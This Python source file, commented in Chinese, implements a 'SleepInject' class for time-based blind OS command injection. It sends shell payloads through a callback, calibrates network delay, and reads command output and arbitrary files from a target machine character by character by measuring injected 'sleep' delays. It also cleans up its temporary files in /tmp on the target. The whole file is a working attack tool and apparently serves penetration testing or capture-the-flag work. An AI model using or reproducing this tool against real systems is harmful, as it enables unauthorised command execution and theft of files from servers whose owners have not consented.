import hashlib, time
from typing import Callable
from requests import Response


class SleepInject:

    def __init__(self, callback_SendAndRecv: Callable[[str], Response], sleepSecs: int = 1):
        """
        时间注入API。

        :param callback_SendAndRecv: 发送payload并接收结果的函数
        :param sleepSecs: 时间注入时休眠的秒数
        """
        self.__function_send = callback_SendAndRecv
        # DIY设置
        self.__tryCharSet = [chr(i) for i in range(32, 127)] + ['\n']  # 猜测字符集
        self.__sleepTime = sleepSecs
        # 调时设置
        self.__averageNetworkTimeout = self.__calibrateTimeout()  # 网络延迟时间
        self.__timeoutPercentage = 0.2  # 误差容忍
        self.__tmpMaxFileLength = 16  # 盲注时产生的临时文件名长度

    def __calibrateTimeout(self, testTimes: int = 3) -> float:
        """
        确定网络延迟时间。

        :param testTimes: 尝试对时次数。
        :return: 平均网络延迟。
        """
        testCMD = f"sleep {self.__sleepTime};"
        timeSave = []
        for _ in range(testTimes):
            startTime = time.time()
            self.__execWithoutSleep(testCMD)
            timeSave.append(time.time() - startTime)
        return sum(timeSave) / testTimes

    def __exec(self, exec_command: str) -> bool:
        """执行给定的命令，从延时判断是否正确。"""
        startTime = time.time()
        self.__execWithoutSleep(exec_command)
        spendTime = time.time() - startTime
        return self.__averageNetworkTimeout * (
                    1 - self.__timeoutPercentage) <= spendTime <= self.__averageNetworkTimeout * (
                           1 + self.__timeoutPercentage)

    def __execWithoutSleep(self, exec_command: str):
        """执行给定的命令，但不测试延迟。"""
        self.__function_send(exec_command)

    def __execHeadAndTest(self, filePath: str, toTestStr: str, forceLength: int = -1):
        """
        简单地执行head命令将文件内容与待测试字符串进行全等比对。

        :param filePath: 要比较的文件的所在路径。
        :param toTestStr: 要比较的字符串。
        :param forceLength: 强制指定取出字符串长度
        :return: 是否比中
        """
        if forceLength > 0:
            payloadLength = forceLength
        else:
            payloadLength = len(toTestStr)
        exec_command = f'if [ $(head -c {payloadLength} \"{filePath}\") == \"{toTestStr}\" ];' + \
            f'then sleep {self.__sleepTime};' + 'fi;'
        return self.__exec(exec_command)

    def __rmTempFile(self, tmpFileName: str, isInTmpFolder: bool = True):
        """
        删除在靶机上产生的临时文件。

        :param tmpFileName: 临时文件名称。
        :param isInTmpFolder: 是否处于临时文件目录下。
        """
        if isInTmpFolder:
            tmpFileName = '/tmp/' + tmpFileName
        self.__execWithoutSleep(f'rm {tmpFileName};')

    def GetResultFromExec(self, exec_command: str) -> str:
        """
        获取命令的执行结果。

        :param exec_command: 要执行的命令，必须支持结果输出且不得带分号。
        :return: 命令执行结果。
        """
        tmp_resultName = hashlib.sha1(exec_command.encode()).hexdigest()[:self.__tmpMaxFileLength]
        self.__execWithoutSleep(exec_command + f' > /tmp/{tmp_resultName};')
        try:
            return self.GetFileContent(f'/tmp/{tmp_resultName}')
        finally:
            self.__rmTempFile(tmp_resultName)

    def GetFileContent(self, filePath: str) -> str:
        """
        获取指定文件的内容。

        :param filePath: 要获取内容的文件所在路径。
        :return: 文件内容。
        """
        fileContent = ''
        lines = self.GetFileLength(filePath, getFileLines=True)
        for lineNo in range(1, lines+1):
            fileContent += self.GetOneLineText(filePath, lineNo) + '\n'
        return fileContent[:-1]

    def GetOneLineText(self, filePath: str, lineNo: int = 1):
        """
        从某个文件中读取一行的内容。

        :param filePath: 要读取内容的文件。
        :param lineNo: 文件行号，从1开始。
        :return: 该行内容。
        """
        tmp_lineCacheFileName = hashlib.md5(f'{filePath}_line_{lineNo}'.encode()).hexdigest()[:self.__tmpMaxFileLength]
        exec_command = f'head -{lineNo} {filePath} | tail -1 > /tmp/{tmp_lineCacheFileName}'
        self.__execWithoutSleep(exec_command)
        lineContent = ''
        lineLength = self.GetFileLength(f'/tmp/{tmp_lineCacheFileName}')
        if lineLength > 0:
            for contentLen in range(lineLength):
                if contentLen != len(lineContent):
                    # 说明已知的字符集没有匹配成功，退出
                    break
                for unit in self.__tryCharSet:
                    toSendContent = (lineContent.replace('$', '\\$') if '$' in lineContent else lineContent) + unit  # 什么特别专门修复措施
                    if self.__execHeadAndTest(f'/tmp/{tmp_lineCacheFileName}', toSendContent,
                                              len(toSendContent) - toSendContent.count('\\$')):
                        lineContent += unit
                        break
        self.__rmTempFile(tmp_lineCacheFileName)
        return lineContent

    def GetFileLength(self, filePath: str, getFileLines: bool = False) -> int:
        """
        获取目标文件的长度或者行数（因为head无法处理换行符）。

        :param filePath: 要获取长度的文件路径。
        :param getFileLines: 切换为获取行数模式。
        :return: 文件长度，文件不存在返回0。若获取行数，则返回行数
        """
        tmp_fileLengthName = hashlib.md5(filePath.encode()).hexdigest()[:self.__tmpMaxFileLength]
        tVar = ''
        testStrs = list(' ' + '0123456789')
        if getFileLines:
            self.__execWithoutSleep(f'wc -l {filePath} > /tmp/{tmp_fileLengthName};')
        else:
            self.__execWithoutSleep(f'wc -c {filePath} > /tmp/{tmp_fileLengthName};')
        flag_found = True
        while flag_found:
            flag_found = False
            for unit in testStrs:
                if self.__execHeadAndTest(f'/tmp/{tmp_fileLengthName}', tVar + unit):
                    tVar += unit
                    flag_found = True
                    break
            if tVar.endswith(' '):
                break
        try:
            return int(tVar)
        except ValueError:
            return 0
        finally:
            self.__rmTempFile(tmp_fileLengthName)
